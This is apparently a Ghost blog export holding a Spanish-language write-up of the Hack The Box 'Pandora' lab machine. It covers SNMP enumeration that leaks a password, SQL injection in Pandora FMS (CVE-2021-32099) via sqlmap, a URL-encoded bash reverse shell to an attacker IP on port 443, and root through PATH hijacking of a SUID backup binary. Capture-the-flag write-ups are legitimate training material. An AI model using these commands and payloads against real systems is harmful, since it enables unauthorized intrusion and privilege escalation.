{
  "db": [
    {
      "meta": { "exported_on": 1699657185069, "version": "5.26.1" },
      "data": {
        "benefits": [],
        "custom_theme_settings": [
          {
            "id": "63a2235fb4a78600c3cb61f7",
            "theme": "casper",
            "key": "navigation_layout",
            "type": "select",
            "value": "Logo in the middle"
          },
          {
            "id": "63a2235fb4a78600c3cb61f8",
            "theme": "casper",
            "key": "title_font",
            "type": "select",
            "value": "Modern sans-serif"
          },
          {
            "id": "63a2235fb4a78600c3cb61f9",
            "theme": "casper",
            "key": "body_font",
            "type": "select",
            "value": "Elegant serif"
          },
          {
            "id": "63a2235fb4a78600c3cb61fa",
            "theme": "casper",
            "key": "show_publication_cover",
            "type": "boolean",
            "value": "true"
          },
          {
            "id": "63a2235fb4a78600c3cb61fb",
            "theme": "casper",
            "key": "header_style",
            "type": "select",
            "value": "Center aligned"
          },
          {
            "id": "63a2235fb4a78600c3cb61fc",
            "theme": "casper",
            "key": "feed_layout",
            "type": "select",
            "value": "Classic"
          },
          {
            "id": "63a2235fb4a78600c3cb61fd",
            "theme": "casper",
            "key": "color_scheme",
            "type": "select",
            "value": "Light"
          },
          {
            "id": "63a2235fb4a78600c3cb61fe",
            "theme": "casper",
            "key": "post_image_style",
            "type": "select",
            "value": "Wide"
          },
          {
            "id": "63a2235fb4a78600c3cb61ff",
            "theme": "casper",
            "key": "email_signup_text",
            "type": "text",
            "value": null
          },
          {
            "id": "63a2235fb4a78600c3cb6200",
            "theme": "casper",
            "key": "show_recent_posts_footer",
            "type": "boolean",
            "value": "true"
          },
          {
            "id": "63a223c200575301481123db",
            "theme": "dawn",
            "key": "title_font",
            "type": "select",
            "value": "Modern sans-serif"
          },
          {
            "id": "63a223c200575301481123dc",
            "theme": "dawn",
            "key": "body_font",
            "type": "select",
            "value": "Modern sans-serif"
          },
          {
            "id": "63a223c200575301481123dd",
            "theme": "dawn",
            "key": "content_api_key_for_search",
            "type": "text",
            "value": null
          },
          {
            "id": "63a223c200575301481123de",
            "theme": "dawn",
            "key": "show_featured_posts",
            "type": "boolean",
            "value": "true"
          },
          {
            "id": "63a223c200575301481123df",
            "theme": "dawn",
            "key": "featured_title",
            "type": "text",
            "value": "Featured articles"
          },
          {
            "id": "63a223c200575301481123e0",
            "theme": "dawn",
            "key": "show_share_links",
            "type": "boolean",
            "value": "true"
          },
          {
            "id": "63a223c200575301481123e1",
            "theme": "dawn",
            "key": "show_author",
            "type": "boolean",
            "value": "true"
          },
          {
            "id": "63a223c200575301481123e2",
            "theme": "dawn",
            "key": "show_related_posts",
            "type": "boolean",
            "value": "true"
          },
          {
            "id": "63b9a9d12d7f8e0065b35dc5",
            "theme": "Solo-main",
            "key": "background_color",
            "type": "color",
            "value": "#ffffff"
          },
          {
            "id": "63b9a9d12d7f8e0065b35dc6",
            "theme": "Solo-main",
            "key": "navigation_layout",
            "type": "select",
            "value": "Logo on the left"
          },
          {
            "id": "63b9a9d12d7f8e0065b35dc7",
            "theme": "Solo-main",
            "key": "typography",
            "type": "select",
            "value": "Modern sans-serif"
          },
          {
            "id": "63b9a9d12d7f8e0065b35dc8",
            "theme": "Solo-main",
            "key": "footer_text",
            "type": "text",
            "value": null
          },
          {
            "id": "63b9a9d12d7f8e0065b35dc9",
            "theme": "Solo-main",
            "key": "header_section_layout",
            "type": "select",
            "value": "Large background"
          },
          {
            "id": "63b9a9d12d7f8e0065b35dca",
            "theme": "Solo-main",
            "key": "primary_header",
            "type": "text",
            "value": "Welcome to my site"
          },
          {
            "id": "63b9a9d12d7f8e0065b35dcb",
            "theme": "Solo-main",
            "key": "secondary_header",
            "type": "text",
            "value": "Subscribe below to receive my latest posts directly in your inbox"
          },
          {
            "id": "63b9a9d12d7f8e0065b35dcc",
            "theme": "Solo-main",
            "key": "post_feed_layout",
            "type": "select",
            "value": "Classic"
          }
        ],
        "newsletters": [
          {
            "id": "63a2235ab4a78600c3cb6009",
            "uuid": "99e1de03-cc01-4fbd-8a49-7b47d63aa4df",
            "name": "ikerocio.com",
            "description": null,
            "feedback_enabled": 0,
            "slug": "default-newsletter",
            "sender_name": null,
            "sender_email": null,
            "sender_reply_to": "newsletter",
            "status": "active",
            "visibility": "members",
            "subscribe_on_signup": 1,
            "sort_order": 0,
            "header_image": null,
            "show_header_icon": 1,
            "show_header_title": 1,
            "title_font_category": "sans_serif",
            "title_alignment": "center",
            "show_feature_image": 1,
            "body_font_category": "sans_serif",
            "footer_content": null,
            "show_badge": 1,
            "show_header_name": 0,
            "created_at": "2022-12-20T21:04:26.000Z",
            "updated_at": "2022-12-20T21:04:41.000Z"
          }
        ],
        "offer_redemptions": [],
        "offers": [],
        "posts": [
          {
            "id": "63a223c10057530148112373",
            "uuid": "2e6f3463-8d53-49a7-860c-d220ce9f3631",
            "title": "CTF - Pandora WriteUp",
            "slug": "pandora-ctf",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/Screenshot_1.png\",\"width\":1334,\"height\":448}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/Screenshot_3.png\",\"width\":566,\"height\":245,\"cardWidth\":\"\",\"caption\":\"/etc/hosts file\"}],[\"code\",{\"language\":\"bash\",\"code\":\"ping -c 1 pandora.htb -R\\nPING pandora.htb (10.10.11.136) 56(124) bytes of data.\\n64 bytes from pandora.htb (10.10.11.136): icmp_seq=1 ttl=63 time=43.7 ms\\nRR: \\t10.10.14.16 (10.10.14.16)\\n\\t10.10.10.2 (10.10.10.2)\\n\\tpandora.htb (10.10.11.136)\\n\\tpandora.htb (10.10.11.136)\\n\\t10.10.14.1 (10.10.14.1)\\n\\t10.10.14.16 (10.10.14.16)\"}],[\"code\",{\"language\":\"bash\",\"code\":\"nmap -p- -sT --min-rate 5000 --open -vvv -n -Pn -oG allPorts pandora.htb\\n# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)\\nHost: 10.10.11.136 ()\\tStatus: Up\\nHost: 10.10.11.136 ()\\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///\\n# Nmap done at Mon Jan 24 18:01:26 2022 -- 1 IP address (1 host up) scanned in 50.99 seconds\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/Screenshot_4.png\",\"width\":671,\"height\":546,\"caption\":\"Static website\"}],[\"code\",{\"code\":\"nmap -p- -sU --min-rate 5000 --open -vvv -n -Pn -oG allPortsUdp pandora.htb \",\"language\":\"bash\",\"caption\":\"nmap UDP port reconnaissance command\"}],[\"code\",{\"language\":\"bash\",\"code\":\"nmap -sUV -p161 -oN targetedUdp pandora.htb\\nNmap scan report for pandora.htb (10.10.11.136)\\nHost is up (0.043s latency).\\n\\nPORT    STATE SERVICE VERSION\\n161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)\\nService Info: Host: pandora\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\n# Nmap done at Tue Jan 25 19:12:28 2022 -- 1 IP address (1 host up) scanned in 2.07 seconds\"}],[\"code\",{\"language\":\"bash\",\"code\":\"snmpwalk -v 2c -O n -c public pandora.htb > snmp.txt\"}],[\"code\",{\"language\":\"bash\",\"code\":\".1.3.6.1.2.1.25.4.2.1.5.832 = STRING: \\\"-f\\\"\\n2034   │ .1.3.6.1.2.1.25.4.2.1.5.836 = STRING: \\\"-f\\\"\\n2035   │ .1.3.6.1.2.1.25.4.2.1.5.840 = STRING: \\\"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\\\"\"}],[\"code\",{\"language\":\"bash\",\"code\":\"ssh daniel@pandora.htb\\ndaniel@pandora.htb's password: \\nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\\nLast login: Sat Jan 29 16:40:25 2022 from 10.10.15.11\\ndaniel@pandora:~$ whoami\\ndaniel\\ndaniel@pandora:~$ hostname -I\\n10.10.11.136 \"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/pivoting-4.svg\",\"width\":694,\"height\":301,\"caption\":\"Pivoting schema\"}],[\"code\",{\"language\":\"bash\",\"code\":\"ssh -L 8080:pandora.htb:80 daniel@pandora.htb\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/Screenshot_5.png\",\"width\":976,\"height\":679,\"caption\":\"Pandora FMS 742 login\"}],[\"code\",{\"language\":\"bash\",\"code\":\"SQL error\\n: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '1' or 1=1' LIMIT 1') in\\n/var/www/pandora/pandora_console/include/db/mysql.php\\non line 114\\nAccess is not granted\"}],[\"code\",{\"language\":\"bash\",\"code\":\"sqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1 -D pandora --sql-query=\\\"SELECT * FROM tsessions_php WHERE data LIKE '%mat%'\\\"\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/Screenshot_6.png\",\"width\":975,\"height\":456,\"caption\":\"Pandora FMS 742 index\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/burpsuite2.png\",\"width\":876,\"height\":504,\"caption\":\"Burpsuite repeater\"}],[\"code\",{\"language\":\"bash\",\"code\":\"nc -lvp 443\"}],[\"code\",{\"language\":\"bash\",\"code\":\"# php -r 'system(\\\"bash -c \\\\\\\"bash -i >& /dev/tcp/10.10.15.17/443 0>&1\\\\\\\"\\\");'\\ninclude/ajax/events&perform_evento_responses=100000&targets=php%20-r%20%27system%28%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.17%2F443%200%3E%261%5C%22%22%29%3B%27&response_id=1\"}],[\"code\",{\"language\":\"bash\",\"code\":\"cd /\\n\\nmatt@pandora:/$ find \\\\-perm -4000 2>/dev/null\\nfind \\\\-perm -4000 2>/dev/null\\n...\\n./usr/bin/pandora_backup\\n\\nmatt@pandora:/$ ls -l /usr/bin/pandora_backup\\n-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup\"}],[\"code\",{\"language\":\"bash\",\"code\":\"matt@pandora:/$ cat /usr/bin/pandora_backup\\nELF>�@0:@8\\n          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � <<Q�tdR�td�-�=�=/lib64/ld-linux-x86-64.so.2GNUqtðG7�%H9�\\n                                                                                                                 ��f��Z�GNU\\n�\\n�e�m\\\\ 4x � %\\\"putssetreuidsystemgetuidgeteuid__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableFu�i\\tP�p�0HH@�?�?�?�?\\t�?\\nSH�=��&/�DH�=�/H��/H9�tH��.H��t@�����H�=Y/H�5R/H)�H��H��?H��H�H��tH��.H����fD���=/u/UH�=�.H��t�H���PTL��H�\\n                                                                                              H�=�.�-����h�����.]�����{���UH��SH������������މ������H�=n����H�=�����H�=��������tH�=��d�����H�=��Q���H�=��E����H�]���f.�AWL�=�+AVI��AUI��ATA��UH�-�+SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\\\\A]A^A_��H�H��PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!\\nCheck your permissions!Backup successful!Terminating program!<(�������������X}�������h���8zRx\\n                                                                                            8���+zRx\\n                                                                                                   $����`FJ\\nE�w                                                                                                        �?�;*3$\\\"D���$\\\\�����A�C\\n  D����]B�I�E �E(�D0�H8�G@j8A0A(B BB�(���p0F\\n\"}],[\"code\",{\"language\":\"bash\",\"code\":\"matt@pandora:/var/www/pandora/pandora_console$ echo $PATH\\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"}],[\"code\",{\"language\":\"bash\",\"code\":\"cd /home/matt && ssh-keygen\"}],[\"code\",{\"language\":\"bash\",\"code\":\"iocio@127.0.0.1:~$ chmod 600 id_rsa && ssh -i id_rsa matt@pandora.htb\\nmatt@pandora:~$ export PATH=/tmp:$PATH\\nmatt@pandora:~$ echo $PATH\\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\\nmatt@pandora:~$ /usr/bin/pandora_backup \\nPandoraFMS Backup Utility\\nNow attempting to backup PandoraFMS client\\nroot@pandora:~# whoami\\nroot\"}],[\"code\",{\"language\":\"bash\",\"code\":\"root@pandora:~# cat /root/root.txt \\nXXX\"}]],\"markups\":[[\"a\",[\"href\",\"http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23\"]],[\"a\",[\"href\",\"https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained\"]],[\"strong\"],[\"a\",[\"href\",\"https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"He de decir que esta máquina aunque se encuentra entre las fáciles, me ha costado más de lo que me imaginaba y de hecho, los usuarios de la plataforma tienen otra opinión de la dificultad al respecto, como se puede ver en la imagen inferior:\"]]],[10,0],[1,\"h2\",[[0,[],0,\"1. Reconocimiento\"]]],[1,\"p\",[[0,[],0,\"Antes de nada, añadimos a nuestro /etc/hosts el dominio de la máquina por si estuviese sirviendo un servicio a través de algún virtual hosting.\"]]],[10,1],[1,\"p\",[[0,[],0,\"Primero de todo, verificamos conexión con el objetivo.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Siendo el TTL~64, podemos asumir que nos encontramos ante una máquina Linux, en lugar de Windows, puesto que estas últimas suelen tener TTL~128.\"]]],[1,\"p\",[[0,[],0,\"Lanzamos un primer comando de NMAP con el fin de enumerar puertos TCP abiertos.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Veo que el puerto 80 está abierto y trato de ver que me encuentro:\"]]],[10,4],[1,\"p\",[[0,[],0,\"Tras haber investigado la web y haber un poco de Fuzzing, doy con una vía muerta. Continúo examinando los puertos UDP a ver que me encuentro.\"]]],[10,5],[1,\"p\",[[0,[],0,\"En este caso, después de haber echado un vistazo a los puertos TCP y no haber encontrado nada interesante, nos interesa mirar los puertos UDP de la máquina por si hay algo que nos pueda resultar útil. Tras haber examinado los puertos, nos encontramos con el puerto 161/UDP abierto. Tras lanzar el siguiente script obtenemos más información al respecto.\"]]],[10,6],[1,\"p\",[[0,[],0,\"SNMP es un protocolo de gestión de red que sirve para monitorizar de forma centralizada el estado de distintos dispositivos conectados a una misma red.\"]]],[1,\"h2\",[[0,[],0,\"2. Análisis de vulnerabilidades\"]]],[1,\"p\",[[0,[],0,\"Con el siguiente comando lanzamos un cliente SNMP e imprimimos el resultado en un archivo de texto que posteriormente analizaremos:\"]]],[10,7],[1,\"p\",[[0,[],0,\"Analizando el archivo snmp.txt y realizando una lectura diagonal de las más de 2000 líneas que contiene, me encuentro con el siguiente resultado:\"]]],[10,8],[1,\"p\",[[0,[],0,\"Hay un usuario denominado \\\"daniel\\\". Intentamos conectarnos a la máquina con las credenciales y...\"]]],[10,9],[1,\"p\",[[0,[],0,\"Estamos dentro. Nos anotamos las credenciales por si las volviésemos a necesitar posteriormente. Continuamos examinando el equipo. Hay otro usuario en el equipo llamado Matt y no podemos entrar en su directorio. Pero quiero saber que es ese proceso (/usr/bin/host_check) que requería las credenciales de dani.\"]]],[1,\"p\",[[0,[],0,\"Imprimo las cadenas de caracteres que contiene el binario y me encuentro la siguiente URL: \"],[0,[0],1,\"http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_|&user=daniel&pass=HotelBabylon23\"]]],[1,\"p\",[[0,[],0,\"Si accedo desde mi máquina, no puedo ver nada. Solo tengo acceso desde el sistema de daniel. \"]]],[10,10],[10,11],[1,\"p\",[[0,[],0,\"Dado que desde pandora.htb, lanzando una petición al puerto 80 soy capaz de ver la nueva máquina, con el comando de arriba realizo un túnel ssh que sincroniza mi puerto local 8080 con el puerto 80 de destino. De esta manera, soy capaz de acceder a la siguiente ventana:\"]]],[10,12],[1,\"h2\",[[0,[],0,\"3. Explotación\"]]],[1,\"p\",[[0,[],0,\"PandoraFMS es un software de monitorización de red que coincide con lo que habíamos descubierto hasta ahora. Llegados a este punto, el siguiente paso natural es comprobar si la versión que hay instalada de pandora (PandoraFMS472) es vulnerable a algún tipo de exploit. Y sí, tras una pequeña búsqueda en Google nos podemos encontrar el siguiente link \"],[0,[1],1,\"(CVE-2021-32099)\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"En él, podemos ver que hay un archivo .php vulnerable a SQL Injection. El archivo en cuestión es \"],[0,[2],1,\"/include/chart_generator.php\"],[0,[],0,\", y el parámetro inyectable es \"],[0,[2],1,\"session_id\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Tras efectuar unas pruebas a http://127.0.0.1:8080/pandora_console/include/chart_generator.php?session_id=1'+or+1=1 podemos confirmar que dicho parámetro es susceptible de inyecciones SQL.\"]]],[10,13],[1,\"p\",[[0,[],0,\"Además, el reporte de la vulnerabilidad nos alerta de la posibilidad de efectuar un bypass de autenticación si fuésemos capaces de introducir un ID de sesión válido.\"]]],[1,\"p\",[[0,[],0,\"Es el turno de recurrir a SQLMap.\"]]],[1,\"p\",[[0,[],0,\"Tras aprovecharnos de la vulnerabilidad y de enumerar las diferentes tablas de la base de datos con sqlmap, vamos a proceder a lanzar un último comando con el fin de recuperar un identificador de sesión del usuario Matt.\"]]],[10,14],[1,\"p\",[[0,[],0,\"De esta forma, si accedo desde mi navegador a http://localhost:8080/pandora_console/include/chart_generator.php?session_id=<gathered_session_id> y posteriormente a http://localhost:8080/pandora_console/index.php, me encontraré dentro del sistema.\"]]],[10,15],[1,\"p\",[[0,[],0,\"Llegados a este punto, tras visitar cada uno de los menús en busca de alguna opción de continuar con el proceso, me he decantado por buscar en internet vulnerabilidades relativas a PandoraFMS de ejecución de código remoto o RCE. He encontrado un \"],[0,[3],1,\"enlace \"],[0,[],0,\"donde se describe un script de Metasploit que permite hacer esto. He decidido lanzar Burpsuite para interceptar la petición que lanza el script y ver con mis propios ojos que hace el exploit. Tras incrustarle la cookie que me permite estar autenticado y ver la ubicación de donde poner el comando a ejecutar, he obtenido la primera flag básica del usuario Matt.\"]]],[10,16],[1,\"p\",[[0,[],0,\"Posteriormente, he utilizado de nuevo Burpsuite para recibir en mi máquina una reverse shell de Matt.\"]]],[1,\"p\",[[0,[],0,\"Ejecuto netcat en escucha en mi máquina local en el puerto 443\"]]],[10,17],[1,\"p\",[[0,[],0,\"y en Burpsuite preparo la petición con la IP de mi máquina, apuntando al puerto 443 donde voy a recibir la shell del usuario que está ejecutando PandoraFMS\"]]],[10,18],[1,\"h2\",[[0,[],0,\"4. Escalado de privilegios\"]]],[1,\"p\",[[0,[],0,\"Cada vez queda menos para el final. Una vez dentro, como Matt, necesito convertirme en el usuario root. Para ello, vamos a buscar ficheros con el privilegio SUID. Este privilegio lo que hace es que el que ejecute el dicho fichero, lo hará con los permisos del creador del archivo.\"]]],[1,\"p\",[[0,[],0,\"Nos vamos a la raíz y ejecutamos lo siguiente:\"]]],[10,19],[1,\"p\",[[0,[],0,\"He eliminado parte del output para quedarnos con lo más importante.\"]]],[1,\"p\",[[0,[],0,\"El binario /usr/bin/pandora_backup tiene permisos de ejecución por los miembros del grupo Matt. Y recordamos que el usuario con el que tenemos acceso ahora es Matt.\"]]],[1,\"p\",[[0,[],0,\"Pero esto no es suficiente. Necesitamos saber que hace ese binario para ver si podemos inyectar algún tipo de código malicioso para que sea el usuario root quien lo ejecute. Si imprimimos los caracteres del binario con el fin de sacar algo más de información, observamos lo siguiente:\"]]],[10,20],[1,\"p\",[[0,[],0,\"El binario ejecuta el comando TAR desde una ruta relativa. Esto da lugar a un tipo de vulnerabilidad conocida como Path Hijacking.\"]]],[1,\"p\",[[0,[],0,\"Los comandos que se pueden ejecutar de forma relativa es gracias a la variable de entorno PATH. Si imprimimos PATH obtenemos lo siguiente:\"]]],[10,21],[1,\"p\",[[0,[],0,\"Linux, busca dentro de esas rutas absolutas el binario del comando que quieres ejecutar. Es decir, primero buscará TAR en /usr/local/sbin, luego en /usr/local/bin, luego en /usr/sbin y así sucesivamente.\"]]],[1,\"p\",[[0,[],0,\"De esta forma, lo que se puede hacer es modificar la variable PATH para tener otra ubicación absoluta, pero una que a mi me interese. En ella, almacenaré un binario denominado TAR que ejecutará una shell. Y gracias a que pandora_backup es un archivo con permisos SUID y su propietario es root, obtendré automáticamente una shell con permisos totales del sistema.\"]]],[1,\"p\",[[0,[],0,\"Allá vamos. Lo primero que vamos a hacer es tener una shell más confiable. Vamos a generarle a Matt una clave pública/privada con el fin de poder conectarnos por ssh sin contraseña (recordamos que no la tenemos, hemos accedido a la shell por una shell reversa).\"]]],[10,22],[1,\"p\",[[0,[],0,\"Nos copiamos la id_rsa (clave privada) en nuestra máquina e id_rsa.pub (clave pública) la ponemos dentro del fichero authorized_keys de la máquina atacada.\"]]],[1,\"p\",[[0,[],0,\"De esta forma, podrémos crear una shell desde nuestra máquina y efectuar los siguientes comandos para efectuar la vulnerabilidad de Path Hijacking.\"]]],[10,23],[1,\"p\",[[0,[],0,\"Y listo. Ya tenemos acceso al sistema. Recuperamos la flag y terminamos con la máquina.\"]]],[10,24],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>He de decir que esta máquina aunque se encuentra entre las fáciles, me ha costado más de lo que me imaginaba y de hecho, los usuarios de la plataforma tienen otra opinión de la dificultad al respecto, como se puede ver en la imagen inferior:</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/01/Screenshot_1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1334\" height=\"448\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/01/Screenshot_1.png 600w, __GHOST_URL__/content/images/size/w1000/2022/01/Screenshot_1.png 1000w, __GHOST_URL__/content/images/2022/01/Screenshot_1.png 1334w\" sizes=\"(min-width: 720px) 720px\"></figure><h2 id=\"1-reconocimiento\">1. Reconocimiento</h2><p>Antes de nada, añadimos a nuestro /etc/hosts el dominio de la máquina por si estuviese sirviendo un servicio a través de algún virtual hosting.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/01/Screenshot_3.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"566\" height=\"245\"><figcaption>/etc/hosts file</figcaption></figure><p>Primero de todo, verificamos conexión con el objetivo.</p><pre><code class=\"language-bash\">ping -c 1 pandora.htb -R\nPING pandora.htb (10.10.11.136) 56(124) bytes of data.\n64 bytes from pandora.htb (10.10.11.136): icmp_seq=1 ttl=63 time=43.7 ms\nRR: \t10.10.14.16 (10.10.14.16)\n\t10.10.10.2 (10.10.10.2)\n\tpandora.htb (10.10.11.136)\n\tpandora.htb (10.10.11.136)\n\t10.10.14.1 (10.10.14.1)\n\t10.10.14.16 (10.10.14.16)</code></pre><p>Siendo el TTL~64, podemos asumir que nos encontramos ante una máquina Linux, en lugar de Windows, puesto que estas últimas suelen tener TTL~128.</p><p>Lanzamos un primer comando de NMAP con el fin de enumerar puertos TCP abiertos.</p><pre><code class=\"language-bash\">nmap -p- -sT --min-rate 5000 --open -vvv -n -Pn -oG allPorts pandora.htb\n# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)\nHost: 10.10.11.136 ()\tStatus: Up\nHost: 10.10.11.136 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///\n# Nmap done at Mon Jan 24 18:01:26 2022 -- 1 IP address (1 host up) scanned in 50.99 seconds</code></pre><p>Veo que el puerto 80 está abierto y trato de ver que me encuentro:</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/01/Screenshot_4.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"671\" height=\"546\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/01/Screenshot_4.png 600w, __GHOST_URL__/content/images/2022/01/Screenshot_4.png 671w\"><figcaption>Static website</figcaption></figure><p>Tras haber investigado la web y haber un poco de Fuzzing, doy con una vía muerta. Continúo examinando los puertos UDP a ver que me encuentro.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-bash\">nmap -p- -sU --min-rate 5000 --open -vvv -n -Pn -oG allPortsUdp pandora.htb </code></pre><figcaption>nmap UDP port reconnaissance command</figcaption></figure><p>En este caso, después de haber echado un vistazo a los puertos TCP y no haber encontrado nada interesante, nos interesa mirar los puertos UDP de la máquina por si hay algo que nos pueda resultar útil. Tras haber examinado los puertos, nos encontramos con el puerto 161/UDP abierto. Tras lanzar el siguiente script obtenemos más información al respecto.</p><pre><code class=\"language-bash\">nmap -sUV -p161 -oN targetedUdp pandora.htb\nNmap scan report for pandora.htb (10.10.11.136)\nHost is up (0.043s latency).\n\nPORT    STATE SERVICE VERSION\n161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)\nService Info: Host: pandora\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Jan 25 19:12:28 2022 -- 1 IP address (1 host up) scanned in 2.07 seconds</code></pre><p>SNMP es un protocolo de gestión de red que sirve para monitorizar de forma centralizada el estado de distintos dispositivos conectados a una misma red.</p><h2 id=\"2-an%C3%A1lisis-de-vulnerabilidades\">2. Análisis de vulnerabilidades</h2><p>Con el siguiente comando lanzamos un cliente SNMP e imprimimos el resultado en un archivo de texto que posteriormente analizaremos:</p><pre><code class=\"language-bash\">snmpwalk -v 2c -O n -c public pandora.htb &gt; snmp.txt</code></pre><p>Analizando el archivo snmp.txt y realizando una lectura diagonal de las más de 2000 líneas que contiene, me encuentro con el siguiente resultado:</p><pre><code class=\"language-bash\">.1.3.6.1.2.1.25.4.2.1.5.832 = STRING: \"-f\"\n2034   │ .1.3.6.1.2.1.25.4.2.1.5.836 = STRING: \"-f\"\n2035   │ .1.3.6.1.2.1.25.4.2.1.5.840 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"</code></pre><p>Hay un usuario denominado \"daniel\". Intentamos conectarnos a la máquina con las credenciales y...</p><pre><code class=\"language-bash\">ssh daniel@pandora.htb\ndaniel@pandora.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\nLast login: Sat Jan 29 16:40:25 2022 from 10.10.15.11\ndaniel@pandora:~$ whoami\ndaniel\ndaniel@pandora:~$ hostname -I\n10.10.11.136 </code></pre><p>Estamos dentro. Nos anotamos las credenciales por si las volviésemos a necesitar posteriormente. Continuamos examinando el equipo. Hay otro usuario en el equipo llamado Matt y no podemos entrar en su directorio. Pero quiero saber que es ese proceso (/usr/bin/host_check) que requería las credenciales de dani.</p><p>Imprimo las cadenas de caracteres que contiene el binario y me encuentro la siguiente URL: <a href=\"http://127.0.0.1/pandora_console/include/api.php?op=get&amp;op2=all_agents&amp;return_type=csv&amp;other_mode=url_encode_separator_%7C&amp;user=daniel&amp;pass=HotelBabylon23\">http://127.0.0.1/pandora_console/include/api.php?op=get&amp;op2=all_agents&amp;return_type=csv&amp;other_mode=url_encode_separator_|&amp;user=daniel&amp;pass=HotelBabylon23</a></p><p>Si accedo desde mi máquina, no puedo ver nada. Solo tengo acceso desde el sistema de daniel. </p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/01/pivoting-4.svg\" class=\"kg-image\" alt loading=\"lazy\" width=\"694\" height=\"301\"><figcaption>Pivoting schema</figcaption></figure><pre><code class=\"language-bash\">ssh -L 8080:pandora.htb:80 daniel@pandora.htb</code></pre><p>Dado que desde pandora.htb, lanzando una petición al puerto 80 soy capaz de ver la nueva máquina, con el comando de arriba realizo un túnel ssh que sincroniza mi puerto local 8080 con el puerto 80 de destino. De esta manera, soy capaz de acceder a la siguiente ventana:</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/01/Screenshot_5.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"976\" height=\"679\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/01/Screenshot_5.png 600w, __GHOST_URL__/content/images/2022/01/Screenshot_5.png 976w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Pandora FMS 742 login</figcaption></figure><h2 id=\"3-explotaci%C3%B3n\">3. Explotación</h2><p>PandoraFMS es un software de monitorización de red que coincide con lo que habíamos descubierto hasta ahora. Llegados a este punto, el siguiente paso natural es comprobar si la versión que hay instalada de pandora (PandoraFMS472) es vulnerable a algún tipo de exploit. Y sí, tras una pequeña búsqueda en Google nos podemos encontrar el siguiente link <a href=\"https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained\">(CVE-2021-32099)</a>.</p><p>En él, podemos ver que hay un archivo .php vulnerable a SQL Injection. El archivo en cuestión es <strong>/include/chart_generator.php</strong>, y el parámetro inyectable es <strong>session_id</strong>.</p><p>Tras efectuar unas pruebas a http://127.0.0.1:8080/pandora_console/include/chart_generator.php?session_id=1'+or+1=1 podemos confirmar que dicho parámetro es susceptible de inyecciones SQL.</p><pre><code class=\"language-bash\">SQL error\n: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '1' or 1=1' LIMIT 1') 